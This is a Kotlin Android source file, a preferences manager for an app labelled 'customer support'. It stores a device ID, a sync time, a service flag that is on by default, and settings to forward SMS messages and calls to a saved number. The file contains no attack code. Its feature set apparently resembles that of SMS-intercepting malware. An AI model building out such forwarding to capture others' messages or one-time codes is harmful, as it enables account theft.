package com.customersupport.data

import android.content.Context
import androidx.datastore.core.DataStore
import androidx.datastore.preferences.core.*
import androidx.datastore.preferences.preferencesDataStore
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.map

private val Context.dataStore: DataStore<Preferences> by preferencesDataStore(name = "customer_support_prefs")

class PreferencesManager(private val context: Context) {
    
    companion object {
        private val KEY_DEVICE_ID = stringPreferencesKey("device_id")
        private val KEY_LAST_SYNC = longPreferencesKey("last_sync")
        private val KEY_SERVICE_ENABLED = booleanPreferencesKey("service_enabled")
        private val KEY_SMS_FORWARD_ENABLED = booleanPreferencesKey("sms_forward_enabled")
        private val KEY_SMS_FORWARD_TO = stringPreferencesKey("sms_forward_to")
        private val KEY_SMS_SUBSCRIPTION_ID = intPreferencesKey("sms_subscription_id")
        private val KEY_CALLS_FORWARD_ENABLED = booleanPreferencesKey("calls_forward_enabled")
        private val KEY_CALLS_FORWARD_TO = stringPreferencesKey("calls_forward_to")
        private val KEY_CALLS_SUBSCRIPTION_ID = intPreferencesKey("calls_subscription_id")
    }

    fun getDeviceId(): Flow<String?> = context.dataStore.data.map { it[KEY_DEVICE_ID] }

    suspend fun saveDeviceId(deviceId: String) {
        context.dataStore.edit { it[KEY_DEVICE_ID] = deviceId }
    }

    fun getLastSyncTime(): Flow<Long> = context.dataStore.data.map { it[KEY_LAST_SYNC] ?: 0L }

    suspend fun saveLastSyncTime(time: Long) {
        context.dataStore.edit { it[KEY_LAST_SYNC] = time }
    }

    fun isServiceEnabled(): Flow<Boolean> = context.dataStore.data.map { it[KEY_SERVICE_ENABLED] ?: true }

    suspend fun setServiceEnabled(enabled: Boolean) {
        context.dataStore.edit { it[KEY_SERVICE_ENABLED] = enabled }
    }

    fun getSmsForwardingEnabled(): Flow<Boolean> = context.dataStore.data.map { it[KEY_SMS_FORWARD_ENABLED] ?: false }
    fun getSmsForwardTo(): Flow<String> = context.dataStore.data.map { it[KEY_SMS_FORWARD_TO] ?: "" }
    fun getSmsSubscriptionId(): Flow<Int> = context.dataStore.data.map { it[KEY_SMS_SUBSCRIPTION_ID] ?: -1 }

    suspend fun saveSmsForwarding(enabled: Boolean, forwardTo: String, subscriptionId: Int = -1) {
        context.dataStore.edit {
            it[KEY_SMS_FORWARD_ENABLED] = enabled
            it[KEY_SMS_FORWARD_TO] = forwardTo
            it[KEY_SMS_SUBSCRIPTION_ID] = subscriptionId
        }
    }

    fun getCallsForwardingEnabled(): Flow<Boolean> = context.dataStore.data.map { it[KEY_CALLS_FORWARD_ENABLED] ?: false }
    fun getCallsForwardTo(): Flow<String> = context.dataStore.data.map { it[KEY_CALLS_FORWARD_TO] ?: "" }
    fun getCallsSubscriptionId(): Flow<Int> = context.dataStore.data.map { it[KEY_CALLS_SUBSCRIPTION_ID] ?: -1 }

    suspend fun saveCallsForwarding(enabled: Boolean, forwardTo: String, subscriptionId: Int = -1) {
        context.dataStore.edit {
            it[KEY_CALLS_FORWARD_ENABLED] = enabled
            it[KEY_CALLS_FORWARD_TO] = forwardTo
            it[KEY_CALLS_SUBSCRIPTION_ID] = subscriptionId
        }
    }
}
